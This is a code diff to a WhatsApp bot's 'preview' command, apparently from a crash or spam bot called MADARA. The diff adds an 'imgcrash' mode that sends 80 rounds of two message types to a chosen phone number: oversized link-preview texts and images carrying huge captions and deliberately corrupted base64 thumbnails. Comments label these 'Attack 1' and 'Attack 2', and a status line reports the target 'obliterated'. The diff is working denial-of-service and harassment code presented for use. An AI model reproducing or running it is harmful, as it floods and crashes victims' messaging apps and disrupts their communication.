@@ -4,9 +4,9 @@ const { createProgressBar } = require('../../lib/progressBar');
 
 module.exports = {
     name: 'preview',
-    aliases: ['linkpreview', 'previewloop'],
+    aliases: ['linkpreview', 'previewloop', 'imgcrash'],
     category: 'madaraeye',
-    desc: 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
+    desc: 'ʟɪɴᴋ + ɪᴍᴀɢᴇ ᴘʀᴇᴠɪᴇᴡ ᴄʀᴀsʜ — ᴅᴜᴀʟ ᴘᴀʏʟᴏᴀᴅ',
     usage: '.preview <number>',
     waitReact: true,
 
@@ -30,14 +30,46 @@ module.exports = {
         const TOTAL = 80;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
+        const urls = [
+            "https://d.top4top.io/p_3829n9zbt1.jpg",
+            "https://c.top4top.io/p_3829tp8hx1.jpg",
+            "https://e.top4top.io/p_38291dfw01.jpg",
+            "https://f.top4top.io/p_3829cp2gn1.jpg",
+            "https://g.top4top.io/p_3829i30lz1.jpg"
+        ];
+        
         try {
             for (let i = 0; i < TOTAL; i++) {
-                await eye.linkPreviewLoop(target, msg);
-                await bar.update(1, 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ');
+                const url = urls[i % urls.length];
+                
+                // ── Attack 1: Link preview message ──────────────────────
+                await sock.sendMessage(target, {
+                    text: `https://t.me/madaraeye\nMADARA EYE ${i}\n${'x'.repeat(30000)}`,
+                    linkPreview: {
+                        "matched-text": "https://t.me/madaraeye",
+                        title: "MADARA EYE",
+                        description: "© MADARA X-MD INC.",
+                        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/' + 'A'.repeat(10000), 'base64'),
+                    }
+                }).catch(() => {});
+                
+                // ── Attack 2: Corrupted image with massive caption ──────
+                await sock.sendMessage(target, {
+                    image: { url },  // Real image URL forces fetch + render
+                    caption: 'MADARA EYE'.repeat(5000),
+                    jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/' + 'B'.repeat(50000), 'base64'),
+                    contextInfo: {
+                        mentionedJid: [target],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                    }
+                }).catch(() => {});
+                
+                await bar.update(1, 'ʟɪɴᴋ + ɪᴍᴀɢᴇ ᴄʀᴀsʜ');
                 if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
             }
             
-            await bar.done(`✅ ᴘʀᴇᴠɪᴇᴡ ʟᴏᴏᴘ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
+            await bar.done(`✅ ᴅᴜᴀʟ ᴘʀᴇᴠɪᴇᴡ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL * 2}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
         } catch (e) {
             await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
         }
